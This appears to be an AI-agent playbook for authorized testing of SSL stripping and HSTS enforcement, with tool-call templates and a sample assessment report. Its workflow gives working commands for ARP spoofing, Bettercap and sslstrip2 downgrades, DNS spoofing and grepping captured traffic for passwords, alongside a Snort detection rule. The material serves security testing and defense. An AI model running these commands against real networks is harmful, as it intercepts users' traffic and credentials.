---
name: cb-ssl-stripping-attack
skill_id: cb-ssl-stripping-attack
journal_id: CB-SKL-324
description: Cold-box analyst playbook — Ssl Stripping Attack. Simulates SSL stripping
  attacks using sslstrip, Bettercap, and mitmproxy in authorized environments to test
  HSTS enforcement, certificate validation, and HTTPS upgrade mechanisms that protect
  users from downgrade attacks on encrypted connec
domain: cold-box
subdomain: network-security
tier: adjacent
case_profiles:
- general
execution_mode: sift_runnable
artifact_platforms:
- any
host_platforms:
- linux
tags:
- network-security
- ssl-stripping
- https
- hsts
- tls-security
cold_box_version: 2
inspired_by: performing-ssl-stripping-attack
---

# Ssl Stripping Attack (cold-box)

> **Journal ID:** `CB-SKL-324` — cite this in every journal entry while following this playbook.

## Cold-box constraints (always)

- Evidence lives on the **sealed operation table** — read only through the viewport (`input_relpath`).
- **Never write** on `operation-table/`; tool output goes to `records/{case_id}/scratch/`.
- **Log this playbook** in the case journal with **`CB-SKL-324`** (`log_skill`) when you adopt it and at each major step.
- Every SIFT execution: `run_sift_tool` with **`purpose`**, **`why`**, and cite returned **`tool_id`** + **`audit_id`** in the journal.
- Prefer `list_sift_tools(verified_only=true)` — skip `[BAD — DO NOT USE]` tools.
- Load this playbook with `get_skill("cb-ssl-stripping-attack")`; do not treat markdown code blocks as direct shell commands.

## Agent loop

1. `suggest_skills(case_profile=...)` or `get_skill("cb-ssl-stripping-attack")` → note **`CB-SKL-324`**
2. `log_skill(case_id, journal_id="CB-SKL-324", action="adopted", note="...")`
3. `list_sift_tools(verified_only=true)` → pick tools from the map below
4. `describe_sift_tool(tool_id)` → `run_sift_tool(...)` → journal stdout with `CB-SKL-324` + `audit_id`
5. `log_skill(..., action="finding", note="...")` when recording conclusions; self-correct if outputs conflict


## When to use

- Testing whether web applications properly enforce HTTPS through HSTS headers and redirect chains
- Validating that HSTS preloading is correctly configured and registered in browser preload lists
- Demonstrating the risk of cleartext HTTP to stakeholders during authorized security assessments
- Assessing whether internal applications and thick clients validate TLS certificates and reject downgrades
- Training SOC teams to detect SSL stripping indicators in network traffic

## Tool map (SIFT via MCP)

**Execution mode:** `sift_runnable` — SIFT tools below are available on this host.

| binary | tool_id | verified | available |
|--------|---------|----------|-----------|
| `wireshark` | `SIFT-118` | no | yes |
| `tshark` | `SIFT-117` | no | no |
| `grep` | `SIFT-010` | yes | yes |
| `tail` | `SIFT-023` | yes | yes |

## Cold-box MCP examples

Use these instead of running shell blocks directly. Always log `{journal_id}` in purpose/why or via `log_skill`.

### `wireshark` → `SIFT-118`

```json
{
  "tool_id": "SIFT-118",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-324] wireshark per playbook step",
  "why": "Executing cb-ssl-stripping-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `tshark` → `SIFT-117`

```json
{
  "tool_id": "SIFT-117",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-324] tshark per playbook step",
  "why": "Executing cb-ssl-stripping-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `grep` → `SIFT-010`

```json
{
  "tool_id": "SIFT-010",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-324] grep per playbook step",
  "why": "Executing cb-ssl-stripping-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `tail` → `SIFT-023`

```json
{
  "tool_id": "SIFT-023",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-324] tail per playbook step",
  "why": "Executing cb-ssl-stripping-attack \u2014 see Procedure section",
  "extra_args": []
}
```

## Journal logging

When you adopt this playbook, append to `records/{case_id}/{case_id}.md`:

```markdown
## {timestamp} — skill `CB-SKL-324` (`cb-ssl-stripping-attack`)

- **action:** adopted | step | finding | deferred | completed
- **note:** What you did or concluded under this playbook
- **related_audit_ids:** (optional) CB-… from run_sift_tool
```

Or call MCP: `log_skill(case_id, journal_id="{journal_id}", action="adopted", note="...")`

## Cold-box path translation

When the procedure below uses host paths, translate as follows:

| Procedure path | Cold-box equivalent |
|----------------|---------------------|
| `C:\Evidence\...` / `/cases/...` | `{input_relpath}` on the sealed table (via viewport) |
| `C:\Output\...` / `/analysis/...` | `records/{case_id}/scratch/` (tool stdout/files) |
| Live SIEM / cloud console steps | **Reference only** on cold-box — note capability gap in journal |

Do not copy evidence off the table except into `records/{case_id}/scratch/` via `run_sift_tool`.


## Procedure

## When to Use

- Testing whether web applications properly enforce HTTPS through HSTS headers and redirect chains
- Validating that HSTS preloading is correctly configured and registered in browser preload lists
- Demonstrating the risk of cleartext HTTP to stakeholders during authorized security assessments
- Assessing whether internal applications and thick clients validate TLS certificates and reject downgrades
- Training SOC teams to detect SSL stripping indicators in network traffic

**Do not use** against networks or applications without explicit written authorization, to intercept real user credentials, or against production systems during business hours without change management approval.

## Prerequisites

- Written authorization specifying in-scope applications and approved attack techniques
- Bettercap 2.x or sslstrip2 installed on the attacker machine
- ARP spoofing or other MITM positioning established (see ARP spoofing skill)
- IP forwarding enabled on the attacker machine
- Wireshark for verifying attack success and capturing evidence
- Test accounts (not real user credentials) for demonstrating credential interception


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Establish MITM Position

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Position via ARP spoofing using Bettercap
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on"

# Alternatively, use arpspoof from dsniff
sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1 &
```

### Step 2: Execute SSL Stripping with Bettercap

```bash
# Start Bettercap with SSL stripping
sudo bettercap -iface eth0

# Enable ARP spoofing
> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true
> arp.spoof on

# Enable HTTP proxy with SSL stripping
> set http.proxy.sslstrip true
> set http.proxy.port 8080
> http.proxy on

# Enable network sniffer for credential capture
> set net.sniff.verbose true
> net.sniff on

# Watch for intercepted HTTP traffic (was HTTPS)
# Bettercap will show credentials and URLs in real-time
```

### Step 3: Execute SSL Stripping with sslstrip2

```bash
# Configure iptables to redirect HTTP traffic through sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start sslstrip
sudo sslstrip2 -l 10000 -w sslstrip_log.txt

# In another terminal, monitor the log for intercepted credentials
tail -f sslstrip_log.txt | grep -i "pass\|user\|login\|email"

# sslstrip works by:
# 1. Intercepting HTTP responses containing HTTPS links
# 2. Replacing https:// with http:// in the response
# 3. Maintaining HTTPS connection to the real server
# 4. Serving downgraded HTTP to the victim
```

### Step 4: Test HSTS Bypass Techniques

```bash
# Check if target has HSTS header
curl -sI https://target-app.example.com | grep -i strict-transport-security

# Check if target is on the HSTS preload list
curl -s "https://hstspreload.org/api/v2/status?domain=example.com" | python3 -m json.tool

# Test HSTS bypass via subdomain substitution
# sslstrip2 can replace URLs with similar-looking HTTP alternatives:
# https://accounts.google.com -> http://accounts.google.com (fails if HSTS)
# https://accounts.google.com -> http://accounts.google.com. (trailing dot bypass attempt)

# Bettercap HSTS bypass with DNS spoofing
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> set dns.spoof.domains target-app.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on
> set http.proxy.sslstrip true
> http.proxy on

# For applications not on HSTS preload, clear HSTS cache in test browser:
# Chrome: chrome://net-internals/#hsts -> Delete domain security policies
# Firefox: Clear recent history -> Active Logins (resets HSTS)
```

### Step 5: Validate Detection and Controls

```bash
# Check from victim's perspective:
# 1. Browser address bar should show http:// instead of https://
# 2. No padlock icon visible
# 3. If HSTS is effective, browser should show error and refuse connection

# Capture evidence of the downgrade
tshark -i eth0 -f "host 192.168.1.50 and port 80" \
  -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
  -Y "http.request" > ssl_strip_evidence.txt

# Verify what the victim sees vs what goes to the real server
# Victim to attacker: HTTP (port 80, cleartext)
tshark -i eth0 -f "src host 192.168.1.50 and dst port 80" -c 20

# Attacker to real server: HTTPS (port 443, encrypted)
tshark -i eth0 -f "dst port 443 and dst host <real_server_ip>" -c 20

# Check IDS/SIEM for detection
# Snort rule that should detect SSL stripping indicators:
# alert tcp any any -> $HOME_NET 80 (msg:"Possible SSL Strip - Login form over HTTP";
#   flow:to_client,established; content:"type=\"password\""; nocase;
#   content:"http://"; nocase; sid:9000010;)

# Check for HSTS missing header alerts
curl -s http://target-app.example.com | grep -i "password\|login"
# If login form is served over HTTP, SSL stripping succeeded
```

### Step 6: Clean Up and Report

```bash
# Stop SSL stripping
# In Bettercap:
> http.proxy off
> arp.spoof off
> quit

# Remove iptables rules
sudo iptables -t nat -F PREROUTING

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Kill background processes
sudo killall sslstrip2 arpspoof 2>/dev/null

# Verify network is restored
ping -c 1 192.168.1.1
```

## Key Concepts

| Term | Definition |
|------|------------|
| **SSL Stripping** | Downgrade attack that intercepts HTTP-to-HTTPS redirects, maintaining encrypted connection to the server while serving cleartext HTTP to the victim |
| **HSTS (HTTP Strict Transport Security)** | HTTP response header that instructs browsers to only connect via HTTPS for a specified duration, preventing SSL stripping in subsequent visits |
| **HSTS Preloading** | Submission of domains to browser-maintained lists that enforce HTTPS from the very first connection, closing the first-visit vulnerability window |
| **Certificate Transparency** | Public logging framework for TLS certificates that enables detection of misissued certificates but does not prevent SSL stripping |
| **Mixed Content** | Web pages served over HTTPS that load resources (scripts, images) over HTTP, creating partial downgrade vulnerability |
| **Upgrade-Insecure-Requests** | CSP directive that instructs browsers to upgrade HTTP requests to HTTPS, complementing HSTS for mixed content prevention |

## Tools & Systems

- **Bettercap 2.x**: Network attack framework with integrated SSL stripping, HTTP/HTTPS proxying, and credential sniffing
- **sslstrip2**: Dedicated SSL stripping tool that transparently downgrades HTTPS to HTTP with URL rewriting
- **mitmproxy**: TLS-intercepting proxy that can modify response headers to remove HSTS and other security headers
- **curl**: Command-line tool for testing HSTS headers, redirect chains, and certificate validation
- **hstspreload.org**: Public HSTS preload list checker for verifying domain inclusion in browser preload databases

## Common Scenarios

### Scenario: Testing HSTS Implementation on a Banking Web Application

**Context**: A bank deployed HSTS on their online banking portal (banking.example.com) six months ago and wants to verify it effectively prevents SSL stripping. The assessment is authorized to test from a workstation on the same VLAN as the test environment using dedicated test accounts.

**Approach**:
1. Verify HSTS header presence and values: `curl -sI https://banking.example.com | grep -i strict` reveals `max-age=31536000; includeSubDomains; preload`
2. Check HSTS preload status: confirmed the domain is on Chrome and Firefox preload lists
3. Set up Bettercap with ARP spoofing and SSL stripping against a test workstation
4. Attempt to access banking.example.com from the test workstation -- Chrome refuses connection with NET::ERR_CERT_AUTHORITY_INVALID (HSTS prevents downgrade)
5. Test with a fresh browser profile (no HSTS cache) -- still blocked because domain is preloaded
6. Test the bank's mobile app -- app successfully connects over HTTP (does not enforce HSTS), exposing credentials in cleartext
7. Test subdomain api.banking.example.com -- not on preload list, SSL stripping succeeds on first visit before HSTS header is cached

**Pitfalls**:
- Testing with a browser that already has HSTS cached for the target domain and concluding HSTS works, when a first-time visitor might be vulnerable
- Not testing subdomains separately -- `includeSubDomains` only works after the parent domain's HSTS header is received
- Forgetting to test mobile applications which may not respect HSTS headers at all
- Not checking for mixed content that could leak session tokens even with HSTS enabled

## Output Format

```
## SSL Stripping Assessment Report

**Test ID**: SSL-STRIP-2024-001
**Target Application**: banking.example.com
**Test Date**: 2024-03-15

### HSTS Configuration

| Property | Value | Status |
|----------|-------|--------|
| HSTS Header Present | Yes | PASS |
| max-age | 31536000 (1 year) | PASS |
| includeSubDomains | Yes | PASS |
| preload | Yes | PASS |
| In Chrome Preload List | Yes | PASS |

### SSL Stripping Test Results

| Target | Client | HSTS Status | Strip Result |
|--------|--------|-------------|--------------|
| banking.example.com | Chrome (cached) | Active | BLOCKED |
| banking.example.com | Chrome (fresh) | Preloaded | BLOCKED |
| banking.example.com | Mobile App | Not Enforced | VULNERABLE |
| api.banking.example.com | Chrome (fresh) | Not Preloaded | VULNERABLE (first visit) |

### Recommendations
1. Implement TLS certificate pinning in the mobile banking app (Critical)
2. Submit api.banking.example.com to HSTS preload list separately
3. Add Content-Security-Policy: upgrade-insecure-requests header
4. Implement certificate transparency monitoring for the domain
```

## Self-correction

- If a SIFT tool errors, read `describe_sift_tool` and pick an alternate from the tool map.
- If procedure steps require SIEM/cloud/live APIs, log `{journal_id}` + `action=deferred` with the gap.
- Do not override `[BAD — DO NOT USE]` tools.
- Mark inference vs confirmed in journal; tie confirmed findings to `audit_id`.

## Limits

- Playbooks guide reasoning; **confirmed findings require tool output** in scratch with matching `audit_id`.
- Reference-mode steps are not executable on cold-box until equivalent SIFT tooling exists.
